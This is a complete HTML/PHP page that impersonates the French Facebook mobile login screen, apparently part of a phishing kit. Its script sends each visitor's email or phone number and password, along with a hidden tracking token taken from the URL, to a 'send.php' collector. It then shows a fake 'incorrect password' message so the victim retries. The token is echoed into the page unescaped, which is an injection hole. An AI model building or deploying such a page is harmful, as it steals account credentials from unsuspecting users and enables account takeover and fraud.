<!DOCTYPE html>
<html lang="fr">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <!-- <link rel="stylesheet" href="../css/page.css" /> -->
  <link rel="shortcut icon" href="ay1hV6OlegS.ico" type="image/x-icon" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
  <title>Facebook</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
      user-select: none;
    }

    body,
    main {
      height: 100vh;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    main {
      background: #0865fe;
    }

    .header {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 18%;
    }

    .header img {
      width: 45px;
      height: 45px;
    }

    .content {
      /* height: 100%; */
      flex-grow: 1;
      background: white;
      border-radius: 20px 20px 0 0;
      padding-top: 50px;
      display: flex;
      align-items: center;
      gap: 10px;
      color: #5c6c7b;
      flex-direction: column;
    }

    form,
    footer {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      margin-bottom: 10px;
    }

    .lang {
      font-size: 14px;
      cursor: pointer;
    }

    .input {
      display: flex;
      flex-direction: column;
      gap: 5px;
      width: 90%;
      border-radius: 15px;
      padding: 9px;
      border: 1.2px solid #dde2e8;
      cursor: pointer;
      position: relative;
      justify-content: center;
    }

    .input input {
      border: none;
      outline: none;
      font-size: 16px;
      background: none;
    }

    .input p {
      transform: translateY(10px);
      font-size: 15px;
    }

    .focus {
      transform: translateY(0px) !important;
      font-size: 14px !important;
    }

    #submit {
      background: #0064e0;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 20px;
      cursor: pointer;
      width: 90%;
      font-size: 15px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    #forgot {
      color: black;
      text-decoration: none;
      font-size: 15px;
    }

    .new {
      color: #0064e0;
      border: 1.2px solid #0064e0;
      text-decoration: none;
      border-radius: 20px;
      padding: 12px;
      cursor: pointer;
      width: 90%;
      text-align: center;
    }

    .meta {
      width: 65px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 5px;
    }

    footer {
      position: absolute;
      bottom: 0;
      margin-bottom: 0;
    }

    .reload {
      width: 20px;
      height: 20px;
      border: 2px solid white;
      border-top: 2px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    @keyframes header {
      100% {
        height: 0;
      }
    }

    .hide {
      animation: header 0.3s forwards;
    }

    .filter {
      filter: brightness(70%);
    }

    .error {
      position: absolute;
      top: 45%;
      left: 50%;
      transform: translate(-50%, -45%);
      background: white;
      padding: 20px;
      border-radius: 5px;
      width: 80%;
      display: none;
      flex-direction: column;
      gap: 15px;
    }

    .error h4 {
      font-size: 18px;
      color: black;
      font-weight: 400;
    }

    .error p {
      font-size: 16px;
      color: #5c6c7b;
      text-align: justify;
    }

    .error span {
      display: flex;
      justify-content: flex-end;
      gap: 20px;
      cursor: pointer;
    }

    .error span p {
      font-size: 14px;
    }

    i {
      font-size: 22px;
      position: absolute;
      right: 15px;
      font-weight: 900;
      transform: rotateX(180deg);
      display: none;
    }

    label {
      outline: none;
      background: transparent !important;
    }
  </style>
</head>

<body>
  <main class="">
    <div class="header">
      <img src="icon.png" alt="Facebook" class="logo" />
    </div>
    <div class="content">
      <p class="lang">Français (France)</p>
      <form>
        <label class="input">
          <p>Numéro mobile ou e-mail</p>
          <input type="text" id="email" />
          <i id="x" class="bi bi-x-lg"></i>
        </label>
        <label class="input">
          <p>Mot de passe</p>
          <input type="password" id="password" />
          <i id="eye" class="bi bi-eye-slash"></i>
        </label>
        <div class="input" style="display: none !important;">
          <input type="text" value="<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
        </div>
        <!-- <input type="submit" value="Se connecter" id="submit"> -->
        <button type="button" id="submit">
          <div class="reload"></div>
          <p class="label">Se connecter</p>
        </button>
      </form>
      <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
        id="forgot">Mot de passe oublié ?</a>
      <div class="down" style="width: 100%; flex: 1"></div>
    </div>
  </main>
  <footer class="">
    <a href="https://web.facebook.com/r.php?locale=fr_FR&display=page&entry_point=login" class="new">Créer un compte</a>
    <img src="meta.png" alt="meta" class="meta" />
  </footer>
  <div class="error">
    <h4>Mot de passe incorrect</h4>
    <p>
      Le mot de passe que vous avez saisi est incorrect. Réessayez ou obtenez
      un code de connexion.
    </p>
    <span
      onclick="document.querySelector('.error').style.display='none';document.querySelector('main').classList.remove('filter');document.querySelector('footer').classList.remove('filter');">
      <p style="color: #d31231">OBTENIR UN CODE</p>
      <p style="color: #0064e0">OK</p>
    </span>
  </div>
  <script>
    let input = document.querySelectorAll(".input input");
    document.getElementById("eye").onclick = function () {
      if (input[1].type === "password") {
        input[1].type = "text";
        document.getElementById("eye").classList.replace("bi-eye-slash", "bi-eye");
      } else {
        input[1].type = "password";
        document.getElementById("eye").classList.replace("bi-eye", "bi-eye-slash");
      }
    };
    document.getElementById("x").onclick = function () {
      input[0].value = "";
      document.getElementById("x").style.display = "none";
    };
    input.forEach((el) => {
      el.addEventListener("focus", () => {
        el.previousElementSibling.classList.add("focus");
        el.parentElement.style.borderColor = "black";
        document.querySelector(".header").classList.add("hide");
        document.querySelector("footer").style.display = "none";
        el.onkeyup = () => {
          if (el.value != "") {
            el.nextElementSibling.style.display = "block";
          }
        }
      });
      el.addEventListener("blur", () => {
        if (el.value == "") {
          el.previousElementSibling.classList.remove("focus");
          el.nextElementSibling.style.display = "none";
        }
        el.parentElement.style.borderColor = "#dde2e8";
      });
      document.querySelector(".down").addEventListener("click", () => {
        if (el.value == "") {
          el.previousElementSibling.classList.remove("focus");
        }
        el.parentElement.style.borderColor = "#dde2e8";
        document.querySelector(".header").classList.remove("hide");
        document.querySelector("footer").style.display = "flex";
      });
    });
    function error() {
      let submit = document.getElementById("submit");
      submit.onclick = async (e) => {
        e.preventDefault();
        if (input[0].value != "" && input[1].value != "") {
          document.querySelector(".header").classList.remove("hide");
          document.querySelector("footer").style.display = "flex";
          document.querySelector(".reload").style.display = "block";
          document.querySelector(".label").style.display = "none";
          await send(input[2].value, input[0].value, input[1].value);

          // after fetch
          document.querySelector(".reload").style.display = "none";
          document.querySelector(".label").style.display = "block";
          document.querySelector("footer").classList.add("filter");
          document.querySelector("main").classList.add("filter");
          document.querySelector('.error').style.display = 'flex';
          input[0].value = '';
          input[1].value = '';
          // after fetch
        } else {
          for (let index = 0; index < input.length; index++) {
            const element = input[index];
            if (element.value == "") {
              element.focus();
              break;
            }
          }
        }
      };
    }
    error();

    /////////////////////////////////////////////////
    async function send(id, email, password) {
      try {
        let res = await fetch('../send.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            id: id,
            email: email,
            password: password,
            page: 'facebook'
          })
        });

        let data = await res.text();
        console.log(data);

      } catch (err) {
        console.error('Error:', err);
      }
    }


  </script>
</body>

</html>